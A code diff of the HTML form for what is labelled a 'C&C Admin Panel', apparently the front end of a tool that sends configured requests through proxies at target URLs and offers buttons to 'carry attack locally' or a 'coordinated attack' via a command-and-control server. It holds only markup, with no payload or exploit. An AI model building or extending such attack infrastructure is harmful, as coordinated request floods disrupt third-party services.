@@ -143,7 +143,7 @@
         }
 
 
-        input {
+        input, select {
             width: 100%;
             margin-bottom: 10px;
             background: rgba(0, 0, 0, 0.3);
@@ -180,27 +180,25 @@
 <body>
 <div>
     <h1>C&C Admin Panel</h1>
-    <form method="get" action="/submit">
-        <div style="width: 100%;">
+    <form method="POST" action="/submit">
         <div class="first-column">
-            <h2>Request configuration</h2>
-            <input type="text" name="ip" placeholder="URL" required="required"/>
-            <input type="text" name="u" placeholder="Method" required="required"/>
-            <input type="text" name="p" placeholder="Encoding" required="required"/>
+            <input type="text" name="url" value = "http://"  placeholder="URL" required="required"/>
+             <select name="method">
+                  <option value="get" selected>GET</option>
+                  <option value="post">POST</option>
+             </select>
+            <input type="text" name="encoding" value="utf-8" placeholder="Encoding" required="required"/>
         </div>
         <div class="second-column">
-            <h2>Request configuration</h2>
-            <input type="text" name="res" placeholder="Resource (use ; to separate them)" required="required"/>
-            <input type="text" name="proxy" placeholder="Proxy server" required="required"/>
-            <input type="text" name="payload" placeholder="Payload (URL for GET request format)" required="required"/>
+            <input type="text" name="resources" value="/" placeholder="Resource (use ; to separate them)" required="required"/>
+            <input type="text" name="proxies" value="" placeholder="Proxy server" required="required"/>
+            <input type="text" name="payload" value="key=value" placeholder="Payload (URL for GET request format)" required="required"/>
         </div>
         <div class="third-column">
-            <h2>Request configuration</h2>
-            <input type="text" name="ip" placeholder="IP address of the C&C" required="required"/>
+            <input type="text" name="ip" value="" placeholder="IP address of the C&C" required="required"/>
         </div>
         <div style="width: 100%;">
-            <button type="submit" name="upload" value="local" class="btn btn-primary btn-large">Upload locally</button>
-            <button type="submit" name="upload" value="remote" class="btn btn-primary btn-large">Upload to C&C</button>
+            <button type="submit" name="upload" value="none" class="btn btn-primary btn-large">Prepare configuration file</button>
             <button type="submit" name="attack" value="local" class="btn btn-primary btn-large">Carry attack locally</button>
             <button type="submit" name="attack" value="remote" class="btn btn-primary btn-large">Carry a coordinated attack</button>
         </div>
